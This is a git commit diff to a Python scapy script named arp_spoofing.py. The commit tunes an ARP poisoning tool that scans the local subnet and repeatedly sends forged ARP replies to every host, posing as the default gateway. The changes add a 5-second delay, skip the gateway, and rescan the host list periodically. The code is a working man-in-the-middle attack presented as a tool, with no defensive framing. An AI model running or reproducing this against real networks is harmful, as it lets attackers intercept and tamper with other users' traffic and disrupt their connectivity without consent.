d9ad30bfc062c344b9a848bfbd7de11b34f8f9be
Tsung-Yu Chan <jkcharlie6679@gmail.com>
2023-05-01 23:43:01 +0200

    feat/optimize the speed   - slow down the arp spoof   - slow down the ip list update

--- arp spoofing/arp_spoofing.py
+++ arp spoofing/arp_spoofing.py
@@ -1,5 +1,6 @@
 import scapy.all as scapy
 import netifaces
+import time
 
 def get_mac(ip):
   arp_request = scapy.ARP(pdst = ip)
@@ -11,6 +12,7 @@ def get_mac(ip):
   return (answered_list[0][1].hwsrc)
 
 def scan(ip):
+  print("--- Update ip list ---")
   arp_request = scapy.ARP(pdst=ip)
   broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
   arp_request_broadcast = broadcast/arp_request
@@ -19,6 +21,7 @@ def scan(ip):
   # print("IP\t\t\tMAC Address\n-------------------------------------------")
   # for element in answered_list:
   #   print(element[1].psrc + "\t\t" + element[1].hwsrc)
+  # print("-----------------------------------------")
   return answered_list
 
 def netmask_to_cidr(netmask):
@@ -36,10 +39,11 @@ def spoof(target_ip, spoof_ip):
                     psrc = spoof_ip)
     scapy.send(packet, verbose=False)
 
-def spoof_all(gateway_ip, network_mask):
-  ip_list = scan(gateway_ip+'/'+str(netmask_to_cidr(network_mask)))
+def spoof_all(gateway_ip, network_mask, ip_list):
   for element in ip_list:
     target_ip = element[1].psrc
+    if target_ip == gateway_ip:
+      continue
     target_mac = element[1].hwsrc
     print(element[1].psrc + "\t\t" + element[1].hwsrc)
     if(element[1].psrc != gateway_ip):
@@ -53,7 +57,15 @@ if __name__ == "__main__":
   gws = netifaces.gateways()
   gateway_ip = gws["default"][netifaces.AF_INET][0]
   network_mask = netifaces.ifaddresses(gws["default"][netifaces.AF_INET][1])[netifaces.AF_INET][0]['netmask']
+  ip_list = scan(gateway_ip+'/'+str(netmask_to_cidr(network_mask)))
+  i = 0
   while True:
-    spoof_all(gateway_ip, network_mask)
-  # spoof('192.168.0.157', gateway_ip)
+    i += 1
+    print("-----------------------------------------")
+    spoof_all(gateway_ip, network_mask, ip_list)
+    time.sleep(5)
+    if i == 6:
+      ip_list = scan(gateway_ip+'/'+str(netmask_to_cidr(network_mask)))
+      i = 0
+    # spoof('192.168.0.157', gateway_ip)
 
